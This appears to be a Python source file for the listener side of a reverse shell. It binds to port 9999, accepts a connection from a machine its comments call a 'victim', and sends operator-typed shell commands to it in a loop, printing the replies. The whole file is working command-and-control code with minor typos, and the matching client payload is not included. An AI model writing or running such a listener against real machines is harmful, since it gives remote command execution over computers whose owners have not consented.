# from glob import glob
# import imp
# from logging.config import listen
import socket
import sys
# from tkinter import N

#  create a socket (connect to victim)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error:" + str(msg))
        
# binding the socket and listning for connections
def bind_socket():
    try:
        global host
        global port
        global s
        
        print("binding the port: " + str(port))
        
        s.bind((host, port))
        s.listen(5)
        
    except socket.error as msg:
        print("socket binding error" + str(msg) + "\m" +"retrying..")
        bind_socket()


# Establish connection with a clint as a socket (Socket must be listing)
def socket_accept():
   conn, address = s.accept()
   print("Connection has been establish! |" + " IP " + address[0] + "| Port " + str(address[1]))
   send_command(conn)
   conn.close()

#  Send command to client/victim
def send_command(conn):
    while True:
        cmd = input()
        if cmd == "quite":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_responce = str(conn.recv(1024), "utf-8")
            print(client_responce, end="")
            
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()